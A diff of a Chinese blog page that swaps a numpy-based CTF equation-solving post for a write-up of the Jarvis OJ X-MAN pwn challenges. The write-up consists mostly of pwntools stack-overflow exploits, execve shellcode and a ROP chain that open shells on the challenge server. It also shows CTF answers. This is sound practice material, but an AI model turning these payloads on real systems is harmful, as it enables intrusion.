@@ -3,20 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>python基于numpy解方程组 | YungGong</title>
+  <title>X-MAN(level0~level2) | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="python基于numpy解方程组">
+  <meta name="description" content="X-MAN(level0~level2)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python基于numpy解方程组">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/index.html">
+<meta property="og:title" content="X-MAN(level0~level2)">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="python基于numpy解方程组">
-<meta property="og:image" content="http://p1.bpimg.com/567571/4293ccfd9c572020.png">
-<meta property="og:updated_time" content="2016-11-28T12:50:55.722Z">
+<meta property="og:description" content="X-MAN(level0~level2)">
+<meta property="og:updated_time" content="2017-02-24T08:14:33.689Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python基于numpy解方程组">
-<meta name="twitter:description" content="python基于numpy解方程组">
-<meta name="twitter:image" content="http://p1.bpimg.com/567571/4293ccfd9c572020.png">
+<meta name="twitter:title" content="X-MAN(level0~level2)">
+<meta name="twitter:description" content="X-MAN(level0~level2)">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -227,11 +225,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-python基于numpy解方程组" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-X-MAN-level0-level2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/11/28/python基于numpy解方程组/" class="article-date">
-      <time datetime="2016-11-28T08:12:18.000Z" itemprop="datePublished">2016-11-28</time>
+      <a href="/2017/02/24/X-MAN-level0-level2/" class="article-date">
+      <time datetime="2017-02-24T06:01:35.000Z" itemprop="datePublished">2017-02-24</time>
 </a>
     </div>
   
@@ -244,7 +242,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      python基于numpy解方程组
+      X-MAN(level0~level2)
     </h1>
   
 
@@ -255,7 +253,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -265,72 +263,65 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="python基于numpy解方程组"><a href="#python基于numpy解方程组" class="headerlink" title="python基于numpy解方程组"></a>python基于numpy解方程组</h1><a id="more"></a>
-<p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。</p>
-<p><img src="http://p1.bpimg.com/567571/4293ccfd9c572020.png" alt=""></p>
-<p>看了前年的writeup加上一位大牛的指点，通过numpy这个包写了python脚本，终于得到了flag。</p>
-<pre><code>import sys
-import numpy
-verify=[
-0x83CD50,
-0x706048,
-0xA9AC74,
-0x9A4AF2,
-0x9F79A0,
-0x7F51A2,
-0x7E4CD8,
-0x7038B0,
-0x7B3708,
-0x687078,
-0x806066,
-0x8F2F2E,
-0x928B34,
-0x7FEDDC,
-0x825768,
-0xACB91E,
-0x90402E,
-0x6F7386,
-0xA01C72,
-0x7C7250,
-0x7AB115,
-0x893C38
-]//这一个数组里包含的是方程组的结果
-matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
-        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
-        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
-        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
-        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
-        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
-        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
-        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
-        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
-        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
-        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
-        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
-        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
-        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
-        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
-        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
-        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
-        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
-        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
-        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
-        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
-        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
-        ]//这一个数组里包含的是方程组的系数
-print len(matrix)
-for i in matrix:
-    if len(i)==21:
-        print i
-result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
-if __name__ == &apos;__main__&apos; :
-       #gen_matrix()
-       verify   = numpy.array(verify )
-       matrix   = numpy.array(matrix )
-       print numpy.linalg.solve(matrix,verify)//解方程组
-       #print result
-       for   x in xrange(len(result)):
-              sys.stdout.write(chr(result[x]))
+        <h1 id="X-MAN-level0-level2"><a href="#X-MAN-level0-level2" class="headerlink" title="X-MAN(level0~level2)"></a>X-MAN(level0~level2)</h1><a id="more"></a>
+<p>题目资源在<a href="https://www.jarvisoj.com" target="_blank" rel="external">这里</a></p>
+<p>这几个题目比较简单，就不一一详细描述了，exp如下：</p>
+<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>栈溢出十分明显，程序里自带callsystem的函数，看了一下，就是调用/bin/sh，直接跳转过去就好</p>
+<pre><code>from pwn import *
+#p=process(&apos;./level0&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+
+call_system=0x0000000000400596
+payload=&apos;a&apos;*136+p64(call_system)
+p.send(payload)
+p.interactive()
+</code></pre><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>同样是很简单的栈溢出，弄清楚shellcode的存放地址</p>
+<pre><code>from pwn import *
+# p = process(&apos;./level1&apos;)  # local
+p = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)  # remote
+p.recvuntil(&apos;:&apos;)
+address = p.recvuntil(&apos;?&apos;, drop=True)
+address = int(address, 16)
+print address
+junk = &apos;a&apos; * 0x88
+ebp = &apos;aaaa&apos;
+retaddr = address + 0x88 + 4 + 4
+shellcode = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
+    &quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \
+    &quot;\x0b\xcd\x80\n&quot;
+payload = junk + ebp + p32(retaddr) + shellcode
+p.send(payload)
+p.interactive()
+</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>还是栈溢出，搜索字符串发现bss段里有“/bin/sh”,可以直接调用。注意p32(4)是虚构的返回地址，随便是申都可以。</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level2&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9878)
+
+systemadd=0x08048320
+shelladd=0x0804A024
+
+payload=&apos;a&apos;*140+p32(systemadd)+p32(4)+p32(shelladd)
+
+p.send(payload)
+p.interactive()
+</code></pre><h3 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h3><p>本题主要考察的是64位下参数的传递顺序，从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9，之后所有的参数通过栈来传递。本题的关键在于将/bin/sh放在RDI寄存器中。</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level2_x64&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)
+
+level2=ELF(&apos;./level2_x64&apos;)
+systemadd=level2.plt[&apos;system&apos;]
+print hex(systemadd)
+
+shelladd=0x00600a90
+rdiret=0x00000000004006b3
+
+payload=&apos;a&apos;*128+&quot;b&quot;*8+p64(rdiret)+p64(shelladd)+p64(systemadd)
+
+p.send(payload)
+p.interactive()
 </code></pre>
       
     </div>
@@ -339,13 +330,13 @@ if __name__ == &apos;__main__&apos; :
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/11/28/python基于numpy解方程组/">python基于numpy解方程组</a></p>
+        <p><span>本文标题:</span><a href="/2017/02/24/X-MAN-level0-level2/">X-MAN(level0~level2)</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
-        <p><span>发布时间:</span>2016年11月28日 - 16时12分</p>
-        <p><span>最后更新:</span>2016年11月28日 - 20时50分</p>
+        <p><span>发布时间:</span>2017年02月24日 - 14时01分</p>
+        <p><span>最后更新:</span>2017年02月24日 - 16时14分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/11/28/python基于numpy解方程组/" title="python基于numpy解方程组">http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/02/24/X-MAN-level0-level2/" title="X-MAN(level0~level2)">http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -358,18 +349,9 @@ if __name__ == &apos;__main__&apos; :
 
 <nav id="article-nav">
   
-    <a href="/2016/11/29/pwn之第三更SUCTF2016/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          pwn之第三更SUCTF2016
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/11/24/reverse之第一更/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">reverse之第一更</div>
+    <a href="/2017/02/24/延迟绑定技术原理/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">延迟绑定技术原理</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -380,7 +362,7 @@ if __name__ == &apos;__main__&apos; :
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python基于numpy解方程组"><span class="toc-number">1.</span> <span class="toc-text">python基于numpy解方程组</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#X-MAN-level0-level2"><span class="toc-number">1.</span> <span class="toc-text">X-MAN(level0~level2)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-number">1.0.1.</span> <span class="toc-text">level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-number">1.0.2.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-number">1.0.3.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2-x86"><span class="toc-number">1.0.4.</span> <span class="toc-text">level2_x86</span></a></li></ol></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -428,7 +410,7 @@ if __name__ == &apos;__main__&apos; :
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2016/11/28/python基于numpy解方程组/" data-title="python基于numpy解方程组" data-url="http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/"></div>
+    <div class="ds-thread" data-thread-key="2017/02/24/X-MAN-level0-level2/" data-title="X-MAN(level0~level2)" data-url="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level0-level2/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -451,13 +433,11 @@ if __name__ == &apos;__main__&apos; :
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/11/29/pwn之第三更SUCTF2016/" title="上一篇: pwn之第三更SUCTF2016">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/11/24/reverse之第一更/" title="下一篇: reverse之第一更">
+            <a href="/2017/02/24/延迟绑定技术原理/" title="下一篇: 延迟绑定技术原理">
                 <i class="fa fa-angle-right"></i>
             </a>
         
